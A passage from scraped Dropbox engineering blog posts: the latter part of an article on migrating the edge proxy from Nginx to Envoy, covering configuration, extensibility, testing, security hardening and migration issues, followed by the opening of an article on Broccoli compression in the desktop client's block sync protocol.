loadbalancers.” From our experience, this ambition works out well. We already use Open Request Cost Aggregation (ORCA) for our internal load testing, and are considering using UDPA for our non-Envoy loadbalancers e.g. our Katran-based eBPF/XDP Layer-4 Load Balancer . This is especially good for Dropbox, where all services internally already interact through gRPC-based APIs. We’ve implemented our own version of xDS control plane that integrates Envoy with our configuration management, service discovery, secret management, and route information. For more information about Dropbox RPC, please read “ Courier: Dropbox migration to gRPC .” There we describe in detail how we integrated service discovery, secret management, stats, tracing, circuit breaking, etc, with gRPC. Here are some of the available xDS services, their Nginx alternatives, and our examples of how we use them: Access Log Service (ALS) , as mentioned above, lets us dynamically configure access log destinations, encodings, and formats. Imagine a dynamic version of Nginx’s log_format and access_log . Endpoint discovery service (EDS) provides information about cluster members. This is analogous to a dynamically updated list of upstream block’s server entries (e.g. for Lua that would be a balancer_by_lua_block ) in the Nginx config. In our case we proxied this to our internal service discovery. Secret discovery service (SDS) provides various TLS-related information that would cover various ssl_* directives (and respectively ssl_*_by_lua_block .)  We adapted this interface to our secret distribution service. Runtime Discovery Service (RTDS) is providing runtime flags. Our implementation of this functionality in Nginx was quite hacky, based on checking the existence of various files from Lua. This approach can quickly become inconsistent between the individual servers. Envoy’s default implementation is also filesystem-based, but we instead pointed our RTDS xDS API to our distributed configuration storage. That way we can control whole clusters at once (through a tool with a sysctl -like interface) and there are no accidental inconsistencies between different servers. Route discovery service (RDS) maps routes to virtual hosts, and allows additional configuration for headers and filters. In Nginx terms, these would be analogous to a dynamic location block with set_header / proxy_set_header and a proxy_pass . On lower proxy tiers we autogenerate these directly from our service definition configs. For an example of Envoy’s integration with an existing production system, here is a canonical example of how to integrate Envoy with a custom service discovery . There are also a couple of open source Envoy control-plane implementations, such as Istio and the less complex go-control-plane . Our homegrown Envoy control plane implements an increasing number of xDS APIs. It is deployed as a normal gRPC service in production, and acts as an adapter for our infrastructure building blocks. It does this through a set of common Golang libraries to talk to internal services and expose them through a stable xDS APIs to Envoy. The whole process does not involve any filesystem calls, signals, cron, logrotate, syslog, log parsers, etc. Configuration Nginx has the undeniable advantage of a simple human-readable configuration. But this win gets lost as config gets more complex and begins to be code-generated. As mentioned above, our Nginx config is generated through a mix of Python2, Jinja2, and YAML. Some of you may have seen or even written a variation of this in erb, pug, Text::Template, or maybe even m4: Copy {% for server in servers %}\r\nserver {\r\n    {% for error_page in server.error_pages %}\r\n    error_page {{ error_page.statuses|join(' ') }} {{ error_page.file }};\r\n    {% endfor %}\r\n    ...\r\n    {% for route in service.routes %}\r\n    {% if route.regex or route.prefix or route.exact_path %}\r\n    location {% if route.regex %}~ {{route.regex}}{%\r\n            elif route.exact_path %}= {{ route.exact_path }}{%\r\n            else %}{{ route.prefix }}{% endif %} {\r\n        {% if route.brotli_level %}\r\n        brotli on;\r\n        brotli_comp_level {{ route.brotli_level }};\r\n        {% endif %}\r\n        ... Our approach to Nginx config generation had a huge issue: all of the languages involved in config generation allowed substitution and/or logic. YAML has anchors, Jinja2 has loops/ifs/macroses, and of course Python is Turing-complete. Without a clean data model, complexity quickly spread across all three of them. This problem is arguably fixable, but there were a couple of foundational ones: There is no declarative description for the config format. If we wanted to programmatically generate and validate configuration, we would need to invent it ourselves. Config that is syntactically valid could still be invalid from a C code standpoint. For example, some of the buffer-related variables have limitations on values, restrictions on alignment, and interdependencies with other variables. To semantically validate a config we needed to run it through nginx -t . Envoy, on the other hand, has a unified data-model for configs: all of its configuration is defined in Protocol Buffers. This not only solves the data modeling problem, but also adds typing information to the config values. Given that protobufs are first class citizens in Dropbox production, and a common way of describing/configuring services, this makes integration so much easier. Our new config generator for Envoy is based on protobufs and Python3. All data modeling is done in proto files, while all the logic is in Python. Here’s an example: Copy from dropbox.proto.envoy.extensions.filters.http.gzip.v3.gzip_pb2 import Gzip\r\nfrom dropbox.proto.envoy.extensions.filters.http.compressor.v3.compressor_pb2 import Compressor\r\n    \r\ndef default_gzip_config(\r\n    compression_level: Gzip.CompressionLevel.Enum = Gzip.CompressionLevel.DEFAULT,\r\n    ) -> Gzip:\r\n        return Gzip(\r\n            # Envoy's default is 6 (Z_DEFAULT_COMPRESSION).\r\n            compression_level=compression_level,\r\n            # Envoy's default is 4k (12 bits). Nginx uses 32k (MAX_WBITS, 15 bits).\r\n            window_bits=UInt32Value(value=12),\r\n            # Envoy's default is 5. Nginx uses 8 (MAX_MEM_LEVEL - 1).\r\n            memory_level=UInt32Value(value=5),\r\n            compressor=Compressor(\r\n                content_length=UInt32Value(value=1024),\r\n                remove_accept_encoding_header=True,\r\n                content_type=default_compressible_mime_types(),\r\n            ),\r\n        ) Note the Python3 type annotations in that code!  Coupled with mypy-protobuf protoc plugin , these provide end-to-end typing inside the config generator. IDEs capable of checking them will immediately highlight typing mismatches. There are still cases where a type-checked protobuf can be logically invalid. In the example above, gzip window_bits can only take values between 9 and 15. This kind of restriction can be easily defined with a help of protoc-gen-validate protoc plugin : Copy google.protobuf.UInt32Value window_bits = 9 [(validate.rules).uint32 = {lte: 15 gte: 9}]; Finally, an implicit benefit of using a formally defined configuration model is that it organically leads to the documentation being collocated with the configuration definitions. Here ’ s an example from gzip.proto : Copy // Value from 1 to 9 that controls the amount of internal memory used by zlib. Higher values.           \r\n// use more memory, but are faster and produce better compression results. The default value is 5.            \r\ngoogle.protobuf.UInt32Value memory_level = 1 [(validate.rules).uint32 = {lte: 9 gte: 1}]; For those of you thinking about using protobufs in your production systems, but worried you may lack a schema-less representation, here’s a good article from Envoy core developer Harvey Tuch about how to work around this using google.protobuf.Struct and google.protobuf.Any : “ Dynamic extensibility and Protocol Buffers .” Extensibility Extending Nginx beyond what’s possible with standard configuration usually requires writing a C module. Nginx’s development guide provides a solid introduction to the available building blocks. That said, this approach is relatively heavyweight. In practice, it takes a fairly senior software engineer to safely write an Nginx module. In terms of infrastructure available for module developers, they can expect basic containers like hash tables/queues/rb-trees, (non-RAII) memory management, and hooks for all phases of request processing. There are also couple of external libraries like pcre, zlib, openssl, and, of course, libc. For more lightweight feature extension, Nginx provides Perl and Javascript interfaces. Sadly, both are fairly limited in their abilities, mostly restricted to the content phase of request processing. The most commonly used extension method adopted by the community is based on a third-party l ua- nginx -module and various OpenResty libraries . This approach can be hooked in at pretty much any phase of request processing. We used log_by_lua for stats collection, and balancer_by_lua for dynamic backend reconfiguration. In theory, Nginx provides the ability to develop modules in C++ . In practice, it lacks proper C++ interfaces/wrappers for all the primitives to make this worthwhile. There are nonetheless some community attempts at it . These are far from ready for production, though. Envoy’s main extension mechanism is through C++ plugins. The process is not as well documented as in Nginx’s case, but it is simpler. This is partially due to: Clean and well-commented interfaces. C++ classes act as natural extension and documentation points. For example, checkout the HTTP filter interface . C++14 language and standard library. From basic language features like templates and lambda functions, to type-safe containers and algorithms. In general, writing modern C++14 is not much different from using Golang or, with a stretch, one may even say Python. Features beyond C++14 and its stdlib. Provided by the abseil library, these include drop-in replacements from newer C++ standards, mutexes with built-in static deadlock detection and debug support, additional/more efficient containers, and much more . For specifics, here’s a canonical example of an HTTP Filter module . We were able to integrate Envoy with Vortex2 (our monitoring framework) with only 200 lines of code by simply implementing the Envoy stats interface. Envoy also has Lua support through moonjit , a LuaJIT fork with improved Lua 5.2 support. Compared to Nginx’s 3rd-party Lua integration it has far fewer capabilities and hooks. This makes Lua in Envoy far less attractive due to the cost of additional complexity in developing, testing, and troubleshooting interpreted code. Companies that specialize in Lua development may disagree, but in our case we decided to avoid it and use C++ exclusively for Envoy extensibility. What distinguishes Envoy from the rest of web servers is its emerging support for WebAssembly (WASM) — a fast, portable, and secure extension mechanism. WASM is not meant to be used directly, but as a compilation target for any general-purpose programming language. Envoy implements a WebAssembly for Proxies specification (and also includes reference Rust and C++ SDKs) that describes the boundary between WASM code and a generic L4/L7 proxy. That separation between the proxy and extension code allows for secure sandboxing, while WASM low-level compact binary format allows for near native efficiency. On top of that, in Envoy proxy-wasm extensions are integrated with xDS. This allows dynamic updates and even potential A/B testing. The “ Extending Envoy with WebAssembly ” presentation from Kubecon’19 (remember that time when we had non-virtual conferences?) has a nice overview of  WASM in Envoy and its potential uses. It also hints at performance levels of 60-70% of native C++ code. With WASM, service providers get a safe and efficient way of running customers’ code on their edge. Customers get the benefit of portability: Their extensions can run on any cloud that implements the proxy-wasm ABI. Additionally, it allows your users to use any language as long as it can be compiled to WebAssembly. This enables them to use a broader set of non-C++ libraries, securely and efficiently. Istio is putting a lot of resources into WebAssembly development: they already have an experimental version of the WASM-based telemetry extension and the WebAssemblyHub community for sharing extensions. You can read about it in detail in “Redefining extensibility in proxies - introducing WebAssembly to Envoy and Istio . ” Currently, we don’t use WebAssembly at Dropbox. But this might change when the Go SDK for proxy-wasm is available. Building and Testing By default, Nginx is built using a custom shell-based configuration system and make-based build system. This is simple and elegant, but it took quite a bit of effort to integrate it into B azel-built monorepo to get all the benefits of incremental, distributed, hermetic, and reproducible builds. Google open - sourced their B azel-built Nginx version which consists of Nginx, BoringSSL, PCRE, ZLIB, and Brotli library/module. Testing-wise, Nginx has a set of Perl-driven integration tests in a separate repository and no unit tests. Given our heavy usage of Lua and absence of a built-in unit testing framework, we resorted to testing using mock configs and a simple Python-based test driver: Copy class ProtocolCountersTest(NginxTestCase):\r\n    @classmethod\r\n    def setUpClass(cls):\r\n        super(ProtocolCountersTest, cls).setUpClass()\r\n        cls.nginx_a = cls.add_nginx(\r\n            nginx_CONFIG_PATH, endpoint=[\"in\"], upstream=[\"out\"],\r\n        )\r\n        cls.start_nginxes()\r\n\r\n    @assert_delta(lambda d: d == 0, get_stat(\"request_protocol_http2\"))\r\n    @assert_delta(lambda d: d == 1, get_stat(\"request_protocol_http1\"))\r\n    def test_http(self):\r\n        r = requests.get(self.nginx_a.endpoint[\"in\"].url(\"/\"))\r\n        assert r.status_code == requests.codes.ok On top of that, we verify the syntax-correctness of all generated configs by preprocessing them (e.g. replacing all IP addresses with 127/8 ones, switching to self-signed TLS certs, etc.) and running nginx -c on the result. On the Envoy side, the main build system is already Bazel. So integrating it with our monorepo was trivial: Bazel easily allows adding external dependencies . We also use copybara scripts to sync protobufs for both Envoy and udpa. Copybara is handy when you need to do simple transformations without the need to forever maintain a large patchset. With Envoy we have the flexibility of using either unit tests (based on gtest/gmock) with a set of pre-written mocks , or Envoy’s integration test framework , or both. There’s no need anymore to rely on slow end-to-end integration tests for every trivial change. gtest is a fairly well-known unit-test framework used by Chromium and LLVM, among others. If you want to know more about googletest there are good intros for both googletest and googlemock . Open source Envoy development requires changes to have 100% unit test coverage . Tests are automatically triggered for each pull request via the Azure CI Pipeline . It’s also a common practice to micro-benchmark performance-sensitive code with google/becnhmark : Copy $ bazel run --compilation_mode=opt test/common/upstream:load_balancer_benchmark -- --benchmark_filter=\".*LeastRequestLoadBalancerChooseHost.*\"\r\nBM_LeastRequestLoadBalancerChooseHost/100/1/1000000          848 ms          449 ms            2 mean_hits=10k relative_stddev_hits=0.0102051 stddev_hits=102.051\r\n... After switching to Envoy, we began to rely exclusively on unit tests for our internal module development: Copy TEST_F(CourierClientIdFilterTest, IdentityParsing) {\r\n  struct TestCase {\r\n    std::vector<std::string> uris;\r\n    Identity expected;\r\n  };\r\n  std::vector<TestCase> tests = {\r\n    {{\"spiffe://prod.dropbox.com/service/foo\"}, {\"spiffe://prod.dropbox.com/service/foo\", \"foo\"}},\r\n    {{\"spiffe://prod.dropbox.com/user/boo\"}, {\"spiffe://prod.dropbox.com/user/boo\", \"user.boo\"}},\r\n    {{\"spiffe://prod.dropbox.com/host/strange\"}, {\"spiffe://prod.dropbox.com/host/strange\", \"host.strange\"}},\r\n    {{\"spiffe://corp.dropbox.com/user/bad-prefix\"}, {\"\", \"\"}},\r\n  };\r\n  for (auto& test : tests) {\r\n    EXPECT_CALL(*ssl_, uriSanPeerCertificate()).WillOnce(testing::Return(test.uris));\r\n    EXPECT_EQ(GetIdentity(ssl_), test.expected);\r\n  }\r\n} Having sub-second test roundtrips has a compounding effect on productivity. It empowers us to put more effort into increasing test coverage. And being able to choose between unit and integration tests allows us to balance coverage, speed, and cost of Envoy tests. Bazel is one of the best things that ever happened to our developer experience. It has a very steep learning curve and is a large upfront investment, but it has a very high return on that investment: incremental builds , remote caching , distributed builds/tests , etc. One of the less discussed benefits of Bazel is that it gives us an ability to query and even augment the dependency graph. A programmatic interface to the dependency graph, coupled with a common build system across all languages, is a very powerful feature. It can be used as a foundational building block for things like linters, code generation, vulnerability tracking, deployment system, etc. Security Nginx’s code surface is quite small, with minimal external dependencies. It’s typical to see only 3 external dependencies on the resulting binary: zlib (or one of its faster variants ), a TLS library, and PCRE. Nginx has a custom implementation of all protocol parsers, the event library, and they even went as far as to re-implement some libc functions. At some point Nginx was considered so secure that it was used as a default web server in OpenBSD. Later two development communities had a falling out, which lead to the creation of httpd . You can read about the motivation behind that move in BSDCon’s “ Introducing OpenBSD ’s new httpd .” This minimalism paid off in practice. Nginx has only had 30 vulnerabilities and exposures reported in more than 11 years. Envoy, on the other hand, has way more code, especially when you consider that that C++ code is far more dense than the basic C used for Nginx. It also incorporates millions of lines of code from external dependencies. Everything from event notification to protocol parsers is offloaded to 3rd party libraries. This increases attack surface and bloats the resulting binary. To counteract this, Envoy relies heavily on modern security practices. It uses AddressSanitizer , ThreadSanitizer , and MemorySanitizer . Its developers even went beyond that and adopted fuzzing . Any opensource project that is critical to the global IT infrastructure can be accepted to the OSS-Fuzz —a free platform for automated fuzzing. To learn more about it, see “ OSS-Fuzz / Architecture .” In practice, though, all these precautions do not fully counteract the increased code footprint. As a result, Envoy has had 22 security advisories in the p ast 2 years . Envoy's security release policy is described in great detail , and in postmortems for selected vulnerabilities. Envoy is also a participant in Google’s Vulnerability Reward Program (VRP) . Open to all security researchers, VRP provides rewards for vulnerabilities discovered and reported according to their rules. For a practical example of how some of these vulnerabilities can be potentially exploited, see this writeup about CVE-2019–18801: “ Exploiting an Envoy heap vulnerability .” To counteract the increased vulnerability risk, we use best binary hardening security practices from our upstream OS vendors Ubuntu and Debian . We defined a special hardened build profile for all edge-exposed binaries. It includes ASLR, stack protectors, and symbol table hardening: Copy build:hardened --force_pic\r\nbuild:hardened --copt=-fstack-clash-protection\r\nbuild:hardened --copt=-fstack-protector-strong\r\nbuild:hardened --linkopt=-Wl,-z,relro,-z,now Forking web-servers, like Nginx, in most environments have issues with stack protector . Since master and worker processes share the same stack canary, and on canary verification failure worker process is killed, the canary can be brute-forced bit-by-bit in about 1000 tries. Envoy, which uses threads as a concurrency primitive, is not affected by this attack. We also want to harden third-party dependencies where we can. We use BoringSSL in FIPS mode , which includes startup self-tests and integrity checking of the binary. We’re also considering running ASAN-enabled binaries on some of our edge canary servers. Features Here comes the most opinionated part of the post, brace yourself. Nginx began as a web server specialized on serving static files with minimal resource consumption. Its functionality is top of the line there: static serving, caching (including thundering herd protection), and range caching. On the proxying side, though, Nginx lacks features needed for modern infrastructures. There’s no HTTP/2 to backends. gRPC proxying is available but without connection multiplexing. There’s no support for gRPC transcoding. On top of that, Nginx’s “open-core” model restricts features that can go into an open source version of the proxy. As a result, some of the critical features like statistics are not available in the “community” version. Envoy, by contrast, has evolved as an ingress/egress proxy, used frequently for gRPC-heavy environments. Its web-serving functionality is rudimentary: no file serving , still work-in-progress caching , neither brotli nor pre-compression. For these use cases we still have a small fallback Nginx setup that Envoy uses as an upstream cluster. When HTTP cache in Envoy becomes production-ready, we could move most of static-serving use cases to it, using S3 instead of filesystem for long-term storage. To read more about eCache design, see “ eCache: a multi-backend HTTP cache for Envoy .” Envoy also has native support for many gRPC-related capabilities: gRPC proxying. This is a basic capability that allowed us to use gRPC end-to-end for our applications (e.g. Dropbox desktop client.) HTTP/2 to backends. This feature allows us to greatly reduce the number of TCP connections between our traffic tiers, reducing memory consumption and keepalive traffic. gRPC → HTTP bridge (+ reverse .)  These allowed us to expose legacy HTTP/1 applications using a modern gRPC stack. gRPC-WEB . This feature allowed us to use gRPC end-to-end even in the environments where middleboxes (firewalls, IDS, etc) don’t yet support HTTP/2. gRPC JSON transcoder . This enables us to transcode all inbound traffic, including Dropbox public APIs , from REST into gRPC. In addition, Envoy can also be used as an outbound proxy. We used it to unify a couple of other use cases: Egress proxy: since Envoy added support for the HTTP CONNECT method , it can be used as a drop-in replacement for Squid proxies. We’ve begun to replace our outbound Squid installations with Envoy. This not only greatly improves visibility, but also reduces operational toil by unifying the stack with a common dataplane and observability (no more parsing logs for stats.) Third-party software service discovery: we are relying on the Courier gRPC libraries in our software instead of using Envoy as a service mesh. But we do use Envoy in one-off cases where we need to connect an open source service with our service discovery with minimal effort. For example, Envoy is used as a service discovery sidecar in our analytics stack. Hadoop can dynamically discover its name and journal nodes. Superset can discover airflow, presto, and hive backends. Grafana can discover its MySQL database. Community Nginx development is quite centralized. Most of its development happens behind closed doors. There’s some external activity on the nginx-devel mailing list, and there are occasional development-related discussions on the official bug tracker . There is an #nginx channel on FreeNode. Feel free to join it for more interactive community conversations. Envoy development is open and decentralized: coordinated through GitHub issues/pull requests, mailing list , and community meetings . There is also quite a bit of community activity on Slack. You can get your invite here . It’s hard to quantify the development styles and engineering community, so let’s look at a specific example of HTTP/3 development. Nginx QUIC and HTTP/3 implementation was recently presented by F5 . The code is clean, with zero external dependencies. But the development process itself was rather opaque. Half a year before that, Cloudflare came up with their own HTTP/3 implementation for Nginx . As a result, the community now has two separate experimental versions of HTTP/3 for Nginx. In Envoy’s case, HTTP/3 implementation is also a work in progress, based on chromium’s \" quiche \" (QUIC, HTTP, Etc.) library. The project’s status is tracked in the GitHub issue . The de sign doc was publicly available way before patches were completed. Remaining work that would benefit from community involvement is tagged with “ help wanted .” As you can see, the latter structure is much more transparent and greatly encourages collaboration. For us, this means that we managed to upstream lots of small to medium changes to Envoy–everything from operational improvements and performance optimizations to new gRPC transcoding features and load balancing changes . Current state of our migration We’ve been running Nginx and Envoy side-by-side for over half a year and gradually switching traffic from one to another with DNS. By now we have migrated a wide variety of workloads to Envoy: Ingress high-throughput services. All file data from Dropbox desktop client is served via end-to-end gRPC through Envoy. By switching to Envoy we’ve also slightly improved users’ performance, due to better connection reuse from the edge. Ingress high-RPS services. This is all file metadata for Dropbox desktop client. We get the same benefits of end-to-end gRPC, plus the removal of the connection pool, which means we are not bounded by one request per connection at a time. Notification and telemetry services. Here we handle all real-time notifications, so these servers have millions of HTTP connections (one for each active client.) Notification services can now be implemented via streaming gRPC instead of an expensive long-poll method. Mixed high-throughput/high-RPS services. API traffic (both metadata and data itself.) This allows us to start thinking about public gRPC APIs. We may even switch to transcoding our existing REST-based APIs right on the Edge. Egress high-throughput proxies. In our case, the Dropbox to AWS communication, mostly S3. This would allow us to eventually remove all Squid proxies from our production network, leaving us with a single L4/L7 data plane. One of the last things to migrate would be www.dropbox.com itself. After this migration, we can start decommissioning our edge Nginx deployments. An epoch would pass. Issues we encountered Migration was not flawless, of course. But it didn’t lead to any notable outages. The hardest part of the migration was our API services. A lot of different devices communicate with Dropbox over our public API—everything from curl- / wget -powered shell scripts and embedded devices with custom HTTP/1.0 stacks, to every possible HTTP library out there. Nginx is a battle-tested de-facto industry standard. Understandably, most of the libraries implicitly depend on some of its behaviors. Along with a number of inconsistencies between Nginx and Envoy behaviors on which our api users depend, there were a number of bugs in Envoy and its libraries. All of them were quickly resolved and upstreamed by us with the community help. Here is just a gist of some the “unusual”/non-RFC behaviors: Merge slashes in URLs . URL normalization and slash merging is a very common feature for web-proxies. Nginx enables slash normalization and slash merging by default but Envoy did not support the latter. We submitted a patch upstream that add that functionality and allows users to opt-in by using the merge_slashes option. Ports in virtual host names . Nginx allows receiving Host header in both forms: either example.com or example.com:port . We had a couple of API users that used to rely on this behavior. First we worked around this by duplicating our vhosts in our configuration (with and without port) but later added an option to ignore the matching port on the Envoy side: strip_matching_host_port . Transfer encoding case sensitivity . A tiny subset API client for some unknown reason used Transfer-Encoding: Chunked (note the capital “C”) header. This is technically valid, since RFC7230 states that Transfer-Encoding / TE headers are case insensitive. The fix was trivial and submitted to the upstream Envoy. Request that have both Content-Length and Transfer-Encoding: c hunked . Requests like that used to work with Nginx, but were broken by Envoy migration. RFC7230 is a bit tricky there , but general idea is web-servers should error these requests because they are likely “smuggled.” On the other hand, next sentence indicates that proxies should just remove the Content-Length header and forward the request. We’ve extended http-parse to allow library users to opt-in into supporting such requests and currently working on adding the support to to Envoy itself. It’s also worth mentioning some common configuration issues we’ve encountered: Circuit-breaking misconfiguration. In our experience, if you are running Envoy as an inbound proxy, especially in a mixed HTTP/1&HTTP/2 environment, improperly set up circuit breakers can cause unexpected downtimes during traffic spikes or backend outages. Consider relaxing them if you are not using Envoy as a mesh proxy. It’s worth mentioning that by default, circuit-breaking limits in Envoy are pretty tight — be careful there! Buffering. Nginx allows request buffering on disk. This is especially useful in environments where you have legacy HTTP/1.0 backends that don’t understand chunked transfer encoding. Nginx could convert these into requests with Content-Length by buffering them on disk. Envoy has a Buffer filter, but without the ability to store data on disk we are restricted on how much we can buffer in memory. If you’re considering using Envoy as your Edge proxy, you would benefit from reading “ Configuring Envoy as an edge proxy .”  It does have security and resource limits that you would want to have on the most exposed part of your infrastructure. What’s next? HTTP/3 is getting closer for the prime time. Support for it was added to the most popular browsers (for now, gated by a flags or command-line options ). Envoy support for it is also experimentally available. After we upgrade the Linux kernel to support UDP acceleration , we will experiment with it on our Edge. Internal xDS-based load balancer and outlier detection. Currently, we are looking at using the combination of Load Reporting service (LRS) and Endpoint discovery service (EDS) as building blocks for creating a common look-aside, load-aware loadbalancer for both Envoy and gRPC. WASM-based Envoy extensions. When Golang proxy-wasm SDK is available we can start writing Envoy extensions in Go which will give us access to a wide variety of internal Golang libs. Replacement for Bandaid. Unifying all Dropbox proxy layers under a single data-plane sounds very compelling. For that to happen we’ll need to migrate a lot of Bandaid features (especially, around loadbalancing ) to Envoy. This is a long way but it’s our current plan. Envoy mobile . Eventually, we want to look into using Envoy in our mobile apps. It is very compelling from Traffic perspective to support a single stack with unified monitoring and modern capabilities (HTTP/3, gRPC, TLS1.3, etc) across all mobile platforms. Acknowledgements This migration was truly a team effort. Traffic and Runtime teams were spearheading it but other teams heavily contributed: Agata Cieplik, Jeffrey Gensler, Konstantin Belyalov, Louis Opter, Naphat Sanguansin, Nikita V. Shirokov, Utsav Shah, Yi-Shu Tai, and of course the awesome Envoy community that helped us throughout that journey. We also want to explicitly acknowledge the tech lead of the Runtime team Ruslan Nigmatullin whose actions as the Envoy evangelist, the author of the Envoy MVP, and the main driver from the software engineering side enabled this project to happen. We’re hiring! If you’ve read this far, there’s a good chance that you actually enjoy digging deep into webservers/proxies and may enjoy working on the Dropbox Traffic team! Dropbox has a globally distributed Edge network, terabits of traffic, and millions of requests per second. All of it is managed by a small team in Mountain View, CA . // Tags Infrastructure gRPC Traffic Open Source Nginx Envoy // Copy link Link copied Link copied", "date": "2020-07-30"},
{"website": "Dropbox", "title": " Broccoli: Syncing faster by syncing less", "author": ["Rishabh Jain"], "link": "https://dropbox.tech/infrastructure/-broccoli--syncing-faster-by-syncing-less", "abstract": "Why now? Why Broccoli encoding? Block sync protocol: An overview Compressed uploads Compressed downloads Future work Acknowledgements Appendix: Broccoli protocol Dropbox syncs petabytes of data every day across millions of desktop clients. It is vital that we constantly improve the sync experience for our users, to increase our users’ productivity in their everyday lives. We also constantly strive to better leverage our infrastructure, increasing Dropbox’s operational efficiency. Because the files themselves are being sent to and from Dropbox during sync, we can leverage redundancies and recurring patterns in common file formats to send files more tersely and consequentially improve performance. Modern compression techniques identify and persist these redundancies and patterns using short bit codes, to transfer large files as smaller, losslessly compressed, files. Thus, compressing files before syncing them means less data on the wire (decreased bandwidth usage and latency for the end user!) and storing smaller pieces in the back end (increased storage cost savings!). To enable these advancements, we measured several common lossless compression algorithms on the incoming data stream at Dropbox including 7zip , zstd , zlib , and Brotli , and we chose to use a slightly modified Brotli encoder, we call Broccoli , to compress files before syncing. Today, we will dive into the Broccoli encoding, provide an overview of the block sync protocol, and explain how we are using them in conjunction to optimize block data transfers. All together, these improvements have reduced median latencies by more than 30% and decreased data on the wire by the same amount. We will talk about the principles we kept in mind and what we have learned along the way. We will also touch upon how our new investments can help us in the future. Why now? We recently finished an ambitious re-write of our sync engine (codenamed “Nucleus”). This rewrite gave us an opportunity to rethink a decade’s worth of assumptions and reimagine what would serve us best for the next one. While compression in our file sync protocol is not a new optimization, new compression research has unlocked a host of new algorithms since we built our original sync engine. Our critical analysis of the new compression options led to even better performance when we rolled out Nucleus. Why Broccoli encoding? We had previously been using zlib for years but our measurements indicated we could do better with newer algorithms. While Dropbox had done research into generic file compression algorithms as well as Lepton , a novel image recompression algorithm, these techniques did not suit themselves to operating at network speeds on client machines. Why the Brotli file format Our initial research into Brotli was promising, and we identified 5 key advantages. File size : Brotli can use unicode or binary context bytes to dynamically select H uffman tables during runtime, which makes a multi-percent difference in final file size. Pre-coding : Since most of the data residing in our persistent store, Magic Pocket , has already been Brotli compressed using Broccoli, we can avoid recompression on the download path of the block download protocol. These pre-coded Brotli files have a latency advantage, since they can be delivered directly to clients, and a size advantage, since Magic Pocket contains Brotli codings optimized with a higher compression quality level. Security : Nucleus is written in Rust and only Brotli and zlib have implementations in the safe subset of Rust. This means that even if clients sent Dropbox intentionally garbled data, the decompressor resists bugs and crashes. Familiarity : We are already making use of Brotli for ma n y of our static web assets. HTTP support : Brotli is a standard for HTTP stream compression, so choosing brotli-format files allows us to use the same format to send to both web browsers and Nucleus None of the other options we tested checked all five of the boxes above. Broccoli requirements We codenamed the Brotli compressor in Rust “Broccoli” because of the capability to make Brotli files concatenate with one another (brot- cat -li). We decided on the broccoli package because it is: Faster : we were able to compress a file at 3x the rate of vanilla Google Brotli using multiple cores to compress the file and then concatenating each chunk. In-process, Simple to use : Broccoli is a function call from Python and a Reader/Writer interface in G olang . Because Dropbox has strict security requirements on running raw C code, Google’s Brotli would need to be run inside a specially crafted low-privilege jail which comes with ongoing maintenance costs and a significant performance degradation, especially for small files. To unlock multithreaded compression (and concatenate-ability), we would need to compress chunks of the file and generate a valid Brotli output. In our design process we discovered a subset of the original Brotli protocol, if modified, could allow files to be stitched together after being compressed. Read more about what changes we made below in the appendix . Block sync protocol: An overview In the following section we summarize how our desktop client uploads and download files to help explain how we layered Broccoli into the protocol. The client sync protocol consists of two sub-protocols: one to sync file metadata, for example filename and size, and one to sync blocks, which are aligned chunks of up to 4 mebibyte (MiB) of a file. This first part, the metadata sync protocol, exposes an interface for the block sync engine to know which blocks are required to be uploaded or downloaded to complete the sync process and arrive at a sync complete state. Today we will focus on the second part, the block sync protocol. The block sync protocol implements a simple interface to transfer data between the client and the server. After stripping off additional information related to authentication and various other optimizations, the protocol appears as follows: Copy rpc PutBlock (PutBlockRequest) returns PutBlockResponse;\r\nrpc GetBlock (GetBlockRequest) returns GetBlockResponse;\r\n\r\nmessage PutBlockRequest {\r\n  bytes block_hash = 1;\r\n  bytes block = 2;\r\n}\r\nmessage PutBlockResponse {}\r\n\r\nmessage GetBlockRequest {\r\n  bytes block_hash = 1;\r\n}\r\nmessage GetBlockResponse {\r\n  bytes block = 1;\r\n} To perform an upload, the client uses the PutBlock end-point and supplies the block and the block hash. This allows us to check the hash on the server to assert that the data wasn’t corrupted on the wire. On download we ask the server through the GetBlock end-point to return a block for a particular block hash. On the server, the storage layer then talks to Magic Pocket to store and retrieve the blocks. Compressed uploads Implementation For uploads, the path was quite clear because we already allowed for compression on the storage layer. We need to now supply the block format to the newly compressed block and the hash of the uncompressed block. Copy message PutBlockRequest {\r\n  bytes block_hash = 1;\r\n  bytes block = 2;\r\n  // An enum describing what compression type is needed.\r\n  BlockFormat block_format = 3; \r\n}\r\nmessage PutBlockResponse {} We need the hash of the uncompressed block because now that we have added a layer of optimization in compression we have also exposed ourselves to a durability issue. Corruption is now possible while compressing the block on the client as our clients rarely have ECC memory. We see a constant rate of memory corruption in the wild and end-to-end integrity verification always pays off. An extra decompression call on the request path can be expensive, but is needed to make sure the compressed file encodes the original. Thinking about the hard tradeoff between durability and performance is actually very easy for us as we can always pick durability as it has always been table stakes principle for infrastructure at Dropbox. Broccoli decompression is cheap, but we still needed to know if it is non-trivial and if it will have more effects than just added latency. For example, we now might need to scale the number of machines. When we benchmarked different block sizes (the maximum is 4MiB) across different kinds of files, we realized this check operates upwards of 300 MiB per second per core, and this is a cost we are willing to pay for the improvements in overall latency and savings in storage. Results For the upload path, we noticed that the the daily average percentage savings in bandwidth usage were around ~33%. When aggregated daily and normalized that 50% of the users save around 13%, 25% of users save around 40%, and 10% of the users benefit the most by saving roughly 70% while uploading files. The p50 of the average size of the request was considerably down from 3.5MiB to roughly 1.6MiB per request. We didn’t see any considerable changes for the p75 request size, which points to the fact that more than a quarter of data that Dropbox hosts and serves is incompressible. This was not surprising as most videos and images are largely incompressible by Broccoli. As for latency, the p50 was down considerably again with an average of a ~35% improvement. Notice how the request size and latency fluctuate periodically. When grouped by the day of the week we saw was that these numbers differed greatly on the weekend, pointing to the fact that users generally work with highly compressible files, such as email, word and pdf documents, during the week and more incompressible content over the weekend, such as movies and pictures. If we break down the upload by file extension, we notice that most of the savings is coming from non-image media, archives, and documents. The figure below shows the compression savings at various quality levels for incoming files. The vertical size of each bar illustrates how large the uncompressed file is as a ratio with all uploads. The area of the bar indicates how much space it occupies in Dropbox’s network pipes after applying each of the three illustrated Broccoli compression quality options. Vertical thickness of bar is fraction of uncompressed files being uploaded. Area of bar is occupancy of the network pipe with broccoli enabled. Deployment Challenges Rolling out the above changes went relatively smoothly until one of the curious engineers on our network team found that compression was actually a bottleneck on high bandwidth connections (100Mbps+ links). Broccoli allows us to set quality levels and we had chosen the precise settings used for durable long-term storage, which is quality = 5, window size = 4 MiB . After benchmarking we decided to go ahead with a lower quality level to remove this 